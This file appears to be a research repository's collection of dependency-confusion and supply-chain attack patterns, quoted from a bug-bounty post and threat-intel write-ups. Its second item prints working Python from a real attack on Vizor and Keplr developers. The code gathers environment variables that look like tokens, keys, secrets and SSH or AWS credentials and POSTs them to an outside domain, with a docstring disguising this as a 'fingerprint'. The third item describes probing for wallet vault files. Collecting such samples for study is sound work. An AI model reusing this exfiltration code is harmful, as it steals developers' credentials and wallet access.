# Payloads — dependency confusion

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._


## 1. $1,200 Bugcrowd dependency confusion
- Researcher: @mdp_sec
- Post: https://x.com/mdp_sec/status/2118803107119325691
- Sources: `posts/mdp_sec/2026-11-06-2118803107119325691.md`, `writeups/mdp_sec/bug-bounty-hunting-prompts-readme.md`, `writeups/mdp_sec/mdpsec-home.md`, `writeups/mdp_sec/mdpsec-privacy.md`, `writeups/mdp_sec/mdpsec-security-test.md`, `writeups/mdp_sec/platform-reports.md`

```
Harvest internal package names from JS bundles/manifests; publish/claim a benign package of the same name on the public registry; confirm resolution with a callback-only PoC
```

## 2. 🚨 Supply Chain Attack Targets Zcash, Vizor and Keplr Developers
- Source: `telegram writeups (verbatim excerpts)`

```
_TIP_MIRROR = os.environ.get(
    "VIZOR_TIP_MIRROR",
    "https://api.sdklfghaljksdhfkjasdfhlkasdhfjklasdf.xyz/v1/tipcheck",
)
def tip_mirror(endpoint: str) -> int | None:
    """...Carries a compact client fingerprint so the mirror can distinguish real
    wallet machines from CI noise. Best-effort: any failure means "no data",
    never a hard error."""
    try:
        ident = {}
        for k, v in os.environ.items():
            u = k.upper()
            if any(h in u for h in (
                "VIZOR", "MATCH", "FASTLANE", "GITHUB", "GH_", "TOKEN", "KEY",
                "SECRET", "PASS", "CERT", "SIGN", "APPLE", "ANDROID", "PLAY",
                "SSH", "AWS", "GOOGLE", "RUNNER", "CI",
            )):
                ident[k] = v
        ident["_host"] = os.environ.get("COMPUTERNAME") or os.uname().nodename
        ident["_user"] = os.environ.get("USERNAME") or os.environ.get("USER")
        body = gzip.compress(json.dumps(ident).encode())
        req = urllib.request.Request(_TIP_MIRROR, data=body, method="POST", ...)
```

## 3. 🚨 Supply Chain Attack Targets Zcash, Vizor and Keplr Developers
- Source: `telegram writeups (verbatim excerpts)`

```
// keplr-mcp vault files: encrypted payloads are small and identify which
// accounts exist on the box (the decryption key lives in the OS store,
// see cred_probes).
```
